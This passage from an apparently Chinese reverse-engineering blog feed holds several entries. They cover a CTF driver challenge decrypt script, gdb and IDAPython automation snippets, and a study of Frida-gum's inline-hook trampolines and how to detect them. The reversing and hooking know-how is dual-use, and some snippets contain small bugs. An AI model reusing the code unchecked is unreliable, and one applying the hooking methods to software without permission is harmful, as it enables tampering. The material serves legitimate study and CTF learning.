    0x22, 0xA5, 0x93, 0x07, 0xB4, 0xFB, 0xB5, 0xCA,
    0xE8, 0x01, 0xF5, 0xAE, 0xED, 0x7B, 0xB8, 0x6A
&#125;;
__int64 __fastcall sub_140001A70(unsigned int *input, int a2)
&#123;
    int j; // [rsp+4h] [rbp-44h]
    int i; // [rsp+8h] [rbp-40h]
    unsigned int input_xor; // [rsp+Ch] [rbp-3Ch] BYREF
    unsigned char *p_input_xor; // [rsp+10h] [rbp-38h]
    unsigned int v6; // [rsp+18h] [rbp-30h]
    char v7[16]; // [rsp+20h] [rbp-28h]
    
    v7[1] = a2 ^ 0x25;
    v7[0] = a2 ^ 0x7A;
    v7[8] = a2 ^ 0x1A;
    v7[2] = a2 ^ 0x35;
    v7[9] = a2 ^ 0x6D;
    v7[3] = a2 ^ 0x23;
    v7[11] = a2 ^ 0x94;
    v7[4] = a2 ^ 0xC5;
    v7[5] = a2 ^ 0x4B;
    v7[6] = a2 ^ 0x21;
    v7[7] = a2 ^ 0x35;
    v7[10] = a2 ^ 0x91;
    v7[12] = a2 ^ 0x2C;
    v7[13] = a2 ^ 0xC1;
    v7[14] = a2 ^ 0x92;
    v7[15] = a2 ^ 0x51;
    for ( i = 0; i &lt; 4; ++i )
    &#123;
        p_input_xor = (unsigned char*)&amp;input_xor;
        input_xor = *input ^ a2;
        for ( j = 0; j &lt; 4; ++j )
            *p_input_xor++ ^= v7[15 - (((unsigned __int8)i + (unsigned __int8)j) &amp; 0xF)] | ((unsigned __int8)j &lt;&lt; j) | j | 4;
        v6 = ~a2 ^ input_xor;
        *input++ = v6;
    &#125;
&#125;
int main()
&#123;
    int v8 = 0;
    BYTE* v17 = byte_140004000;
    do
    &#123;
        sub_140001A70((unsigned int *)v17, v8++);
        v17 += 16;
    &#125; while (v8 &lt; 2);
    for (unsigned char c : byte_140004000)
        printf(&quot;%d,&quot;, c);
    printf(&quot;\n&quot;);
&#125;
</code></pre>
<p>然后发现模拟结果和解密明明对得上，但是出不来，结论是藏东西了或者改东西了，毕竟没有真起起来调，然后发现前面有这个init，寻找特定的结构shr ecx, 0x5，把5改成6</p>
<p><img src="/2024/04/02/driver%E5%A4%8D%E7%8E%B0-%E9%93%81%E4%B8%892024/image.png" alt="image"></p>
<p>土里刨一个脚本出来：</p>
<pre><code class="cpp">#include&lt;bits/stdc++.h&gt;
using namespace std;
void decrypt(uint32_t *v, uint32_t *key)
&#123;
    uint32_t l = v[0], r = v[1], sum = 0x9E3779B9 * 33;
    for (int i = 0; i &lt; 33; ++i)
    &#123;
        r -= (key[(sum &gt;&gt; 11) &amp; 3] + sum) ^ (l + ((l &gt;&gt; 5) ^ (16 * l)));
        sum += 0x61C88647;
        l -= (key[sum &amp; 3] + sum) ^ (r + ((r &gt;&gt; 6) ^ (16 * r)));
        
    &#125;
    v[0] = l, v[1] = r;
&#125;

int main()&#123;
    uint32_t key[4];
    // 加解密对称！！！
//	uint8_t enc[] = &#123;0x72, 0x62, 0xAE, 0x34, 0x52, 0x9A, 0x06, 0xAF, 
//							0x72, 0xFB, 0x40, 0xC0, 0x10, 0x35, 0xBD, 0xD4,
//							0x22, 0xA5, 0x93, 0x07, 0xB4, 0xFB, 0xB5, 0xCA,
//							0xE8, 0x01, 0xF5, 0xAE, 0xED, 0x7B, 0xB8, 0x6A&#125;;
    uint8_t enc[] = &#123;216,10,158,244,59,162,215,207,72,43,33,160,195,93,221,84,137,205,162,199,220,195,101,170,211,209,149,206,63,19,217,234&#125;;
    key[0] = 0x1A2B;
    key[1] = 0x3A4D;
    key[2] = 0x5E6F;
    key[3] = 0xAA33;
    for (int i=0;i&lt;32;i+=8)&#123;
        uint32_t *p = (uint32_t *)&amp;enc[i];
        p[0] = __builtin_bswap32(p[0]);
        p[1] = __builtin_bswap32(p[1]);
        decrypt((uint32_t*)p,key);
        p[0] = __builtin_bswap32(p[0]);
        p[1] = __builtin_bswap32(p[1]);
    &#125;
    for (int i=0;i&lt;32;i++)&#123;
        printf(&quot;%c&quot;,enc[i]);
    &#125;
    return 0;
&#125;
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>flutter开发初探</title>
    <url>/2024/03/28/flutter%E5%BC%80%E5%8F%91%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="PREFACE：本意是练练手开发（二进制实在看累了，顺便积累一点安卓）"><a href="#PREFACE：本意是练练手开发（二进制实在看累了，顺便积累一点安卓）" class="headerlink" title="PREFACE：本意是练练手开发（二进制实在看累了，顺便积累一点安卓）"></a>PREFACE：本意是练练手开发（<del>二进制实在看累了，顺便积累一点安卓</del>）</h6><span id="more"></span>

<p>项目地址：<a href="https://github.com/DeMoYao100/woyao_app">DeMoYao100&#x2F;woyao_app (github.com)</a> 不定期更新（希望）</p>
<p>环境配置：<a href="https://flutter.cn/docs">Flutter 开发文档 | Flutter 中文文档 - Flutter 中文开发者网站 - Flutter</a>，推荐vscode（出现过热重载问题，有实在看不出来的bug建议clean一下）</p>
<p>环境搭建SDK issue：<a href="https://stackoverflow.com/questions/76882205/error-linkageerror-occurred-while-loading-main-class-com-android-sdklib-tool-sd">https://stackoverflow.com/questions/76882205/error-linkageerror-occurred-while-loading-main-class-com-android-sdklib-tool-sd</a></p>
<p>一些遇到的问题写在注释里了，代码不长，目前就两千行，没咋写注释…</p>
<p>配置签名和安卓一样，加icon注意一下版本问题</p>
<blockquote>
<p>flutter clean</p>
<p>flutter pub get</p>
<p>dart run flutter_launcher_icons:main</p>
<p>flutter build apk –release</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>gdb_python初探</title>
    <url>/2023/11/09/gdb-python%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="PREFACE：感觉有时候用得到（其实是看到了别人的脚本不会用）"><a href="#PREFACE：感觉有时候用得到（其实是看到了别人的脚本不会用）" class="headerlink" title="PREFACE：感觉有时候用得到（其实是看到了别人的脚本不会用）"></a>PREFACE：感觉有时候用得到（<del>其实是看到了别人的脚本不会用</del>）</h6><span id="more"></span>

<pre><code># https://www.hex-rays.com/products/ida/support/idadoc/1343.shtml
gdbserver --multi *:1234
</code></pre>
<p>然后可以在gdb里面使用gdb脚本</p>
<p>使用方法：</p>
<pre><code>(gdb) source path/to/your/script.py
</code></pre>
<p>几个api使用：</p>
<ul>
<li>使用gdb内部的指令：</li>
</ul>
<pre><code class="python">gdb.execute(&#39;指令&#39;)
# eg.
gdb.execute(&#39;c&#39;)  
gdb.execute(&#39;b *0x55555559C078&#39;)
</code></pre>
<ul>
<li>获取寄存器：</li>
</ul>
<pre><code class="python">frame = gdb.selected_frame()
rip = frame.read_register(&quot;rip&quot;)
</code></pre>
<p>其实感觉只需要<code>gdb.execute</code>，配合gdb原生的指令，就可以愉快开始hook了，甚至可以轻松把调试过程都记录下来，确实好东西</p>
<p>比如这样：</p>
<pre><code class="python">while 1:
    frame = gdb.selected_frame()
    rip = frame.read_register(&quot;rip&quot;)
    if rip == 0x55555559C078 :	# 这里是断点
        rdx = frame.read_register(&quot;rdx&quot;)
    gdb.execute(&#39;c&#39;)
</code></pre>
<hr>
<p>一些其他的tips：</p>
<p>从AT&amp;T语法切换到intel语法：</p>
<blockquote>
<p>echo ‘set disassembly-flavor intel’ &gt;&gt; ~&#x2F;.gdbinit</p>
</blockquote>
<p>使用gdb自带的指令</p>
<blockquote>
<p>gdb -x script.gdb .&#x2F;file</p>
<blockquote>
<p>script.gdb</p>
<p>条件断点，eg.在断点处打印$rax或执行一些需要的操作；类似idapython<code>print(get_reg_value(&#39;rax&#39;))</code></p>
<pre><code>b *main
commands
    silent
    p $rax
    continue
end
r
q
</code></pre>
</blockquote>
</blockquote>
<p>补：这里有一个issue，dbg或者gef用的时候会调用一个有bug的gdb api，有需要<code>continue</code>的时候用<code>pi gdb.execute(&quot;continue&quot;)</code></p>
]]></content>
  </entry>
  <entry>
    <title>frida源码初探</title>
    <url>/2024/04/27/frida%E6%BA%90%E7%A0%81%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="PREFACE：被拷打到frida和xpose的原理啥的，啥啥不会，爬来赶紧学学"><a href="#PREFACE：被拷打到frida和xpose的原理啥的，啥啥不会，爬来赶紧学学" class="headerlink" title="PREFACE：被拷打到frida和xpose的原理啥的，啥啥不会，爬来赶紧学学"></a>PREFACE：被拷打到frida和xpose的原理啥的，啥啥不会，爬来赶紧学学</h6><span id="more"></span>

<h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><p>首先是一整个<a href="https://github.com/frida/frida">frida</a>项目可以分为这些subprojects：</p>
<ul>
<li><a href="https://github.com/frida/frida-clr">frida-clr</a>：Frida .NET bindings</li>
<li><a href="https://github.com/frida/frida-core/tree/da417fd46b4fd7af8f157498e9e5f38e6242be45">frida-core</a>：Frida core library intended for static linking into bindings</li>
<li><a href="https://github.com/frida/frida-go/tree/fd52f64f49fbbde2820e02e6e6dd3aafd1ac0ce6">frida-go</a>：Frida Go bindings</li>
<li><a href="https://github.com/frida/frida-gum/tree/c385fac6e3b2512c64e10e3e039f2a7be6995ab9">frida-gum</a>：Cross-platform instrumentation and introspection library written in C</li>
<li><a href="https://github.com/frida/frida-node/tree/72b815e0fc7fb3ab4dc90e9532739b6dc99c3b8f">frida-node</a>：Frida Node.js bindings</li>
<li><a href="https://github.com/frida/frida-python/tree/91e2e4ff54d7afa4a2d3660019da981e92967e8f">frida-python</a>：Frida Python bindings</li>
<li><a href="https://github.com/frida/frida-qml/tree/5c8eb8c84a5f808cb109e67e80e8e77c4f80da77">frida-qml</a>：Frida Qml plugin</li>
<li><a href="https://github.com/frida/frida-swift/tree/ce8f781ef000b7bfc9f90f942df2d0c973d4f52b">frida-swift</a>：Frida Swift bindings</li>
<li><a href="https://github.com/frida/frida-tools/tree/49f4330d8fde4e5250ac78f35ea71b4d7441fdb6">frida-tools</a>：Frida CLI tools</li>
</ul>
<p>感觉网上许多文章都着重在看frida-core和frida-gum，那么就先看看这两部分</p>
<h3 id="frida-gum"><a href="#frida-gum" class="headerlink" title="frida-gum"></a>frida-gum</h3><p>分析过程中感觉直接干看还是有点困难，这里先整理一些frida所实现的功能，对照着功能看进去</p>
<h4 id="一、前置原理"><a href="#一、前置原理" class="headerlink" title="一、前置原理"></a>一、前置原理</h4><h5 id="1-1-inline-hook"><a href="#1-1-inline-hook" class="headerlink" title="1.1 inline hook"></a>1.1 inline hook</h5><p>​		我们可以使用 Frida 的 API 在程序运行时拦截函数的调用，并且在拦截到函数调用时，通过修改函数的参数或者返回值来改变程序的行为。</p>
<p>​		这里的核心原理是：动态替换需要 Hook 的指令片段为一段经过设计的跳板指令，即 trampoline ，目标为我们设计好的一段 shellCode，这里可以看[<a href="https://bbs.kanxue.com/thread-273273.htm">原创]Frida inlineHook原理分析及简单设计一款AArch64 inlineHook工具-Android安全-看雪-安全社区|安全招聘|kanxue.com</a>这篇文章对于Frida生成的shellcode进行了详细的研究，暂时没有进行复现，先纸面学习，大概需要注意的点是：</p>
<ul>
<li>frida寻找前后128MB的地址获取一个空闲地址，将hook的点的前16个字节（或4字节）替换掉为LDR和BR指令，并且利用x16寄存器作为trampoline跳板</li>
<li>第一段跳板跳到shellcode后mmap一段匿名内存，保存当前寄存器状态与用于写入第二段跳板指令</li>
<li>然后是onenter和onleave的编写，注入shellcode实现需求的逻辑即可（这里是简易的核心原理，后面代码会复杂很多）</li>
</ul>
<h6 id="1-2-inline-hook-检测"><a href="#1-2-inline-hook-检测" class="headerlink" title="1.2 inline hook 检测"></a>1.2 inline hook 检测</h6><p>恰好学习的时候搜到<a href="https://www.cnblogs.com/r0ysue/p/15424821.html">这篇文章</a>，一块记录了</p>
<p>​		既然frida会生成trampoline和shellcode，那么有个很简单的方法：开一个线程，检查函数开头有没有被替换过，并且有没有被替换成类似BR到shellcode的格式</p>
<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p>readme描述：</p>
<p>Cross-platform instrumentation and introspection library written in C.</p>
<p>This library is consumed by <a href="https://github.com/frida/frida-core">frida-core</a> through its JavaScript bindings, <a href="https://github.com/frida/frida-gum/tree/master/bindings/gumjs">GumJS</a>.</p>
<p>然后文档有大概给出不同部分的功能（词汇量稍微有点不够咳咳）不过直接看着稍微有点没头绪，先看看<a href="https://o0xmuhe.github.io/2019/11/15/frida-gum%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/">别人的分析</a>，这篇写的不错)</p>
<p>偷看一下别人的阅读思路：</p>
<p><img src="/2024/04/27/frida%E6%BA%90%E7%A0%81%E5%88%9D%E6%8E%A2/image-20240428202138661.png" alt="image-20240428202138661"></p>
<p>首先有个meson.build构建文件，其中可以先看gumtest.c这一测试运行器（根据testcase递归看进代码）</p>
<pre><code class="cpp">runner_sources = [
  &#39;gumtest.c&#39;,
  &#39;testutil.c&#39;,
  &#39;stubs&#39; / &#39;dummyclasses.c&#39;,
  &#39;stubs&#39; / &#39;fakebacktracer.c&#39;,
  &#39;stubs&#39; / &#39;fakeeventsink.c&#39;,
  &#39;stalkerdummychannel.c&#39;,
  &#39;lowlevelhelpers.c&#39;,
]
</code></pre>
<h5 id="gumtest-c"><a href="#gumtest-c" class="headerlink" title="gumtest.c"></a>gumtest.c</h5><p>前面一大段代码根据宏来判断，是用于根据平台信息做初始化的</p>
<p>标记一个核心对象先：</p>
<pre><code class="cpp">struct _GumInterceptor
&#123;
#ifndef GUM_DIET
  GObject parent;
#else
  GumObject parent;
#endif

  GRecMutex mutex;

  GHashTable * function_by_address;

  GumInterceptorBackend * backend;
  GumCodeAllocator allocator;

  volatile guint selected_thread_id;

  GumInterceptorTransaction current_transaction;
&#125;;
</code></pre>
<p>拦截器初始化</p>
<pre><code class="cpp">GumInterceptor *
gum_interceptor_obtain (void)
&#123;
  GumInterceptor * interceptor;

  g_mutex_lock (&amp;_gum_interceptor_lock);

#ifndef GUM_DIET
  if (_the_interceptor != NULL)
  &#123;
    interceptor = GUM_INTERCEPTOR (g_object_ref (_the_interceptor));
  &#125;
  else
  &#123;
    _the_interceptor = g_object_new (GUM_TYPE_INTERCEPTOR, NULL);
    g_object_weak_ref (G_OBJECT (_the_interceptor),
        the_interceptor_weak_notify, NULL);

    interceptor = _the_interceptor;
  &#125;
#else
  if (_the_interceptor != NULL)
  &#123;
    interceptor = gum_object_ref (_the_interceptor);
  &#125;
  else
  &#123;
    _the_interceptor = g_new0 (GumInterceptor, 1);
    _the_interceptor-&gt;parent.ref_count = 1;
    _the_interceptor-&gt;parent.finalize = gum_interceptor_finalize;
    gum_interceptor_init (_the_interceptor);

    interceptor = _the_interceptor;
  &#125;
#endif

  g_mutex_unlock (&amp;_gum_interceptor_lock);

  return interceptor;
&#125;
</code></pre>
<p>attach上函数的方法：</p>
<p>传入地址，调用<code>gum_interceptor_resolve</code></p>
<pre><code class="cpp">GumAttachReturn
gum_interceptor_attach (GumInterceptor * self,
                        gpointer function_address,
                        GumInvocationListener * listener,
                        gpointer listener_function_data)
&#123;
  GumAttachReturn result = GUM_ATTACH_OK;
  GumFunctionContext * function_ctx;
  GumInstrumentationError error;

  gum_interceptor_ignore_current_thread (self);
  GUM_INTERCEPTOR_LOCK (self);
  gum_interceptor_transaction_begin (&amp;self-&gt;current_transaction);
  self-&gt;current_transaction.is_dirty = TRUE;

  function_address = gum_interceptor_resolve (self, function_address);

  function_ctx = gum_interceptor_instrument (self, GUM_INTERCEPTOR_TYPE_DEFAULT,
      function_address, &amp;error);

  if (function_ctx == NULL)
    goto instrumentation_error;

  if (gum_function_context_has_listener (function_ctx, listener))
    goto already_attached;

  gum_function_context_add_listener (function_ctx, listener,
      listener_function_data);

  goto beach;

instrumentation_error:
  &#123;
    switch (error)
    &#123;
      case GUM_INSTRUMENTATION_ERROR_WRONG_SIGNATURE:
        result = GUM_ATTACH_WRONG_SIGNATURE;
        break;
      case GUM_INSTRUMENTATION_ERROR_POLICY_VIOLATION:
        result = GUM_ATTACH_POLICY_VIOLATION;
        break;
      case GUM_INSTRUMENTATION_ERROR_WRONG_TYPE:
        result = GUM_ATTACH_WRONG_TYPE;
        break;
      default:
        g_assert_not_reached ();
    &#125;
    goto beach;
  &#125;
already_attached:
  &#123;
    result = GUM_ATTACH_ALREADY_ATTACHED;
    goto beach;
  &#125;
beach:
  &#123;
    gum_interceptor_transaction_end (&amp;self-&gt;current_transaction);
    GUM_INTERCEPTOR_UNLOCK (self);
    gum_interceptor_unignore_current_thread (self);

    return result;
  &#125;
&#125;
</code></pre>
<p>跟进看这里的实现</p>
<pre><code class="cpp">static gpointer
gum_interceptor_resolve (GumInterceptor * self,
                         gpointer address)
&#123;
  address = gum_strip_code_pointer (address);

  if (!gum_interceptor_has (self, address))
  &#123;
    const gsize max_redirect_size = 16;
    gpointer target;

    gum_ensure_code_readable (address, max_redirect_size);

    /* Avoid following grafted branches. */
    if (gum_process_get_code_signing_policy () == GUM_CODE_SIGNING_REQUIRED)
      return address;

    target = _gum_interceptor_backend_resolve_redirect (self-&gt;backend,
        address);
    if (target != NULL)
      return gum_interceptor_resolve (self, target);
  &#125;

  return address;
&#125;
</code></pre>
<p>可以进到：这部分是比较核心的生成跳转shellcode的部分，或许也可以从这部分下手来考虑对抗？(TODO+1)</p>
<pre><code class="cpp">gpointer
gum_arm64_reader_try_get_relative_jump_target (gconstpointer address)
&#123;
  gpointer result = NULL;
  csh capstone;
  cs_insn * insn;
  const uint8_t * code;
  size_t size;
  uint64_t pc;
  const cs_arm64_op * ops;

  cs_arch_register_arm64 ();
  cs_open (CS_ARCH_ARM64, GUM_DEFAULT_CS_ENDIAN, &amp;capstone);
  cs_option (capstone, CS_OPT_DETAIL, CS_OPT_ON);

  insn = cs_malloc (capstone);

  code = address;
  size = 16;
  pc = GPOINTER_TO_SIZE (address);

#define GUM_DISASM_NEXT() \
    if (!cs_disasm_iter (capstone, &amp;code, &amp;size, &amp;pc, insn)) \
      goto beach; \
    ops = insn-&gt;detail-&gt;arm64.operands
#define GUM_CHECK_ID(i) \
    if (insn-&gt;id != G_PASTE (ARM64_INS_, i)) \
      goto beach
#define GUM_CHECK_OP_TYPE(n, t) \
    if (ops[n].type != G_PASTE (ARM64_OP_, t)) \
      goto beach
#define GUM_CHECK_OP_REG(n, r) \
    if (ops[n].reg != G_PASTE (ARM64_REG_, r)) \
      goto beach
#define GUM_CHECK_OP_MEM(n, b, i, d) \
    if (ops[n].mem.base != G_PASTE (ARM64_REG_, b)) \
      goto beach; \
    if (ops[n].mem.index != G_PASTE (ARM64_REG_, i)) \
      goto beach; \
    if (ops[n].mem.disp != d) \
      goto beach

  GUM_DISASM_NEXT ();

  switch (insn-&gt;id)
  &#123;
    case ARM64_INS_B:
      result = GSIZE_TO_POINTER (ops[0].imm);
      break;
#ifdef HAVE_DARWIN
    case ARM64_INS_ADRP:
    &#123;
      GumAddress target;

      GUM_CHECK_OP_REG (0, X17);
      target = ops[1].imm;

      GUM_DISASM_NEXT ();
      GUM_CHECK_ID (ADD);
      GUM_CHECK_OP_REG (0, X17);
      GUM_CHECK_OP_REG (1, X17);
      GUM_CHECK_OP_TYPE (2, IMM);
      target += ops[2].imm;

      GUM_DISASM_NEXT ();
      GUM_CHECK_ID (LDR);
      GUM_CHECK_OP_REG (0, X16);
      GUM_CHECK_OP_TYPE (1, MEM);
      GUM_CHECK_OP_MEM (1, X17, INVALID, 0);

      GUM_DISASM_NEXT ();
      GUM_CHECK_ID (BRAA);
      GUM_CHECK_OP_REG (0, X16);
      GUM_CHECK_OP_REG (1, X17);

      result = *((gpointer *) GSIZE_TO_POINTER (target));

      break;
    &#125;
#endif
    default:
      break;
  &#125;

beach:
  cs_free (insn, 1);

  cs_close (&amp;capstone);

  return result;
&#125;
</code></pre>
<p>创建拦截器后端以及分配器初始化</p>
<pre><code class="cpp">gum_interceptor_init (GumInterceptor * self)
&#123;
  g_rec_mutex_init (&amp;self-&gt;mutex);

  self-&gt;function_by_address = g_hash_table_new_full (NULL, NULL, NULL,
      (GDestroyNotify) gum_function_context_destroy);

  gum_code_allocator_init (&amp;self-&gt;allocator, GUM_INTERCEPTOR_CODE_SLICE_SIZE);

  gum_interceptor_transaction_init (&amp;self-&gt;current_transaction, self);
&#125;
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>idaTracing</title>
    <url>/2023/11/12/idaTracing/</url>
    <content><![CDATA[<h6 id="PREFACE：上次做tree的时候就在想了，这个完全跟不明白且没有思路的玩意，搞点记录已经走过的指令或者函数调用栈啥的"><a href="#PREFACE：上次做tree的时候就在想了，这个完全跟不明白且没有思路的玩意，搞点记录已经走过的指令或者函数调用栈啥的" class="headerlink" title="PREFACE：上次做tree的时候就在想了，这个完全跟不明白且没有思路的玩意，搞点记录已经走过的指令或者函数调用栈啥的"></a>PREFACE：上次做tree的时候就在想了，这个完全跟不明白且没有思路的玩意，搞点记录已经走过的指令或者函数调用栈啥的</h6><h6 id="结果今天才知道ida有这些功能的，速速学了"><a href="#结果今天才知道ida有这些功能的，速速学了" class="headerlink" title="结果今天才知道ida有这些功能的，速速学了"></a>结果今天才知道ida有这些功能的，速速学了</h6><span id="more"></span>

<p>首先我还是必须祭出这张图片</p>
<p><img src="/2023/11/12/idaTracing/image-20231112104323168.png" alt="image-20231112104323168"></p>
<p>然后想要跟这个玩意，当时我是都hook上，然后一个一个拆…</p>
<p>然后有这个：</p>
<pre><code>Debugger -&gt; Tracing -&gt; 可以设置指令、基本块或函数的调用trace
</code></pre>
<p>tracing windows里面可以看到这里traced的内容，一整个符合需求了，甚至可以给已走过的指令上色</p>
<p><img src="/2023/11/12/idaTracing/image-20231112104526102.png" alt="image-20231112104526102"></p>
<h6 id="TODO：研究一下trace的其他功能"><a href="#TODO：研究一下trace的其他功能" class="headerlink" title="TODO：研究一下trace的其他功能"></a>TODO：研究一下trace的其他功能</h6>]]></content>
  </entry>
  <entry>
    <title>goAst初探</title>
    <url>/2023/11/09/goAst%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="占坑，晚点来学学goastpy啥的"><a href="#占坑，晚点来学学goastpy啥的" class="headerlink" title="占坑，晚点来学学goastpy啥的"></a>占坑，晚点来学学goastpy啥的</h6><span id="more"></span>
]]></content>
  </entry>
  <entry>
    <title>idapython初探</title>
    <url>/2023/10/12/idapython%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="PREFACE：确实不熟，但是确实该学学一些自动化东西，反正萌新么记录一下"><a href="#PREFACE：确实不熟，但是确实该学学一些自动化东西，反正萌新么记录一下" class="headerlink" title="PREFACE：确实不熟，但是确实该学学一些自动化东西，反正萌新么记录一下"></a>PREFACE：确实不熟，但是确实该学学一些自动化东西，反正萌新么记录一下</h6><h6 id="11-12：发现这个https-bbs-kanxue-com-thread-225920-htm"><a href="#11-12：发现这个https-bbs-kanxue-com-thread-225920-htm" class="headerlink" title="11.12：发现这个https://bbs.kanxue.com/thread-225920.htm"></a>11.12：发现这个<a href="https://bbs.kanxue.com/thread-225920.htm">https://bbs.kanxue.com/thread-225920.htm</a></h6><span id="more"></span>

<ul>
<li>批量获取函数Xref</li>
</ul>
<pre><code class="python">&quot;&quot;&quot;
arg: addr : hex
ret: XrefList : list
&quot;&quot;&quot;
def XrefList(addr):
    x_list = []
    for x_addr in XrefsTo(addr, flags=0):
        x_list.append(hex(addr.frm))
    return x_list
</code></pre>
<ul>
<li>返回函数参数（todo，有点难度的）</li>
</ul>
<pre><code class="python">import ida_bytes
import ida_idp
import ida_search
import ida_ua
import idc

def find_function_arg(addr):
    while True:
        # 使用 idc.prev_head 而不是 ida_bytes.prev_head
        addr = idc.prev_head(addr, ida_ida.cvar.inf.min_ea)
        # 使用 idc.get_mnem 而不是 GetMnem
        if idc.get_mnem(addr) == &quot;mov&quot; and &quot;esi&quot; in idc.get_operand_value(addr, 0):
            # 使用 idc.get_operand_value 而不是 GetOperandValue
            print(&quot;We found it at 0x%x&quot; % idc.get_operand_value(addr, 1))
            break

# 替换为你的目标地址
find_function_arg(0x5D2966)
</code></pre>
<ul>
<li>从地址返回指令</li>
</ul>
<pre><code class="python">&quot;&quot;&quot;
arg: addr : hex
ret: [addr, mnemonic, op_str]
&quot;&quot;&quot;
def get_asm_from_addr(addr):
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    # 创建一个 insn_t 对象来存储解码的指令
    insn = ida_ua.insn_t()
    ida_ua.decode_insn(insn, addr)
    insn_bytes = ida_bytes.get_bytes(addr, insn.size)
    # 打印指令的助记符和操作数
    x = []
    for i in md.disasm(insn_bytes, addr):
        x.append(hex(i.address))
        x.append(i.mnemonic)
        x.append(i.op_str)
    return x
</code></pre>
<ul>
<li>找到特定的十六进制（全段查找）</li>
</ul>
<pre><code class="python">&quot;&quot;&quot;
arg: hex_of_pattern : str
ret: void
&quot;&quot;&quot;
def find_pattern(bytes_to_find): # 例如 &quot;FF E0&quot;
    for seg_ea in idautils.Segments():
        seg_end = idc.get_segm_end(seg_ea)
        ea = seg_ea
        while (ea &lt;= seg_end):
            ea = idaapi.find_binary(ea, seg_end, bytes_to_find, 16, idaapi.SEARCH_DOWN)
            if ea != idaapi.BADADDR:
                # 这里填写需要的处理逻辑，ea即找到的地址
                print(hex(ea))
            ea = idc.next_head(ea)
</code></pre>
<ul>
<li>查找特定的汇编地址（全段查找）</li>
</ul>
<pre><code class="python">&quot;&quot;&quot;
arg: assembly_code : str
ret: void
&quot;&quot;&quot;
from keystone import *
def find_pattern(assembly_code):
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    new_bytes , _= ks.asm(assembly_code)
    new_bytes = [hex(new_bytes[i])[2:] for i in range(0, len(new_bytes), 1)]
    new_bytes = &#39; &#39;.join(new_bytes)
    for seg_ea in idautils.Segments():
        seg_end = idc.get_segm_end(seg_ea)
        ea = seg_ea
        while (ea &lt;= seg_end):
            ea = idaapi.find_binary(ea, seg_end, new_bytes , 16, idaapi.SEARCH_DOWN)
            if ea != idaapi.BADADDR:
                # 这里填写需要的处理逻辑，ea即找到的地址
                print(hex(ea))
            ea = idc.next_head(ea)
</code></pre>
<ul>
<li>查找某条地址的上一条汇编地址信息</li>
</ul>
<pre><code class="python">&quot;&quot;&quot;
arg: addr : str
ret: addr : hex
    , len_of_opcode : int
&quot;&quot;&quot;
def find_prev_addr(addr):
    prev_inst_addr = ida_bytes.prev_head(address, ida_ida.cvar.inf.min_ea)
    prev_inst_size = ida_bytes.get_item_size(prev_inst_addr)
    return prev_inst_addr, prev_inst_size
</code></pre>
<ul>
<li>patch脚本</li>
</ul>
<pre><code class="python">&quot;&quot;&quot;
arg: addr : str
     assembly_code : str
ret: void
&quot;&quot;&quot;
def patch_addr(addr, assembly_code)
    new_bytes , _= ks.asm(assembly_code)
    new_bytes = [(new_bytes[i]) for i in range(0, len(new_bytes), 1)]
    for i in range(prev_inst_addr, prev_inst_addr + len(new_bytes), 1):
        patch_byte(i, new_bytes[j])
        j += 1
</code></pre>
<ul>
<li>批量hook</li>
</ul>
<pre><code class="python">class MyDbgHook(idaapi.DBG_Hooks):
    def dbg_bpt(self, tid, ea):
        if ea in addresses_to_hook:
            # 设置处理逻辑
            rax_value = ida_dbg.get_reg_val(&quot;RAX&quot;)
            print(&quot;Breakpoint at 0x%X, RAX = 0x%X&quot; % (ea, rax_value))
            ida_dbg.continue_process()
        return 0

# 实例化并注册我们的调试器 hook
debug_hook = MyDbgHook()
debug_hook.hook()

# 为列表中的每个地址设置断点
for address in addresses_to_hook:
    idc.add_bpt(address, 0, idc.BPT_SOFT)

# 启动或继续调试过程
ida_dbg.run_requests()
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>laurelAndYanny</title>
    <url>/2023/11/26/laurelAndYanny/</url>
    <content><![CDATA[<h6 id="PREFACE：宿舍传了一个www-xiaohongshu-com视频，就是那个mimi和gulu混淆那个声音。然后传给一个复旦做aigc的爷，想着要不要写个小工具玩玩-鸽子叫"><a href="#PREFACE：宿舍传了一个www-xiaohongshu-com视频，就是那个mimi和gulu混淆那个声音。然后传给一个复旦做aigc的爷，想着要不要写个小工具玩玩-鸽子叫" class="headerlink" title="PREFACE：宿舍传了一个www.xiaohongshu.com视频，就是那个mimi和gulu混淆那个声音。然后传给一个复旦做aigc的爷，想着要不要写个小工具玩玩(鸽子叫)"></a>PREFACE：宿舍传了一个<a href="https://www.xiaohongshu.com/discovery/item/655e08f10000000032030e79?app_platform=ios&app_version=8.14.3&share_from_user_hidden=true&type=video&xhsshare=WeixinSession&appuid=61a4c0af000000000201859a&apptime=1700751420">www.xiaohongshu.com</a>视频，就是那个mimi和gulu混淆那个声音。然后传给一个复旦做aigc的爷，想着要不要写个小工具玩玩(鸽子叫)</h6><h6 id="这两天总算ddl弄了一下，来做下子信息收集，才发现已有一些研究"><a href="#这两天总算ddl弄了一下，来做下子信息收集，才发现已有一些研究" class="headerlink" title="这两天总算ddl弄了一下，来做下子信息收集，才发现已有一些研究"></a>这两天总算ddl弄了一下，来做下子信息收集，才发现已有一些研究</h6><span id="more"></span>

<p>历史小故事</p>
<p><a href="https://zh.wikipedia.org/wiki/Laurel%E6%88%96Yanny%E7%88%AD%E8%AB%96">Laurel或Yanny争论 - 维基百科，自由的百科全书 (wikipedia.org)</a></p>
<p>好玩的工具(一开始我们想实现的效果，不过既然有人做了~)：</p>
<p><a href="https://www.nytimes.com/interactive/2018/05/16/upshot/audio-clip-yanny-laurel-debate.html">We Made a Tool So You Can Hear Both Yanny and Laurel - The New York Times (nytimes.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>junk code demo</title>
    <url>/2023/07/18/junk-code-demo/</url>
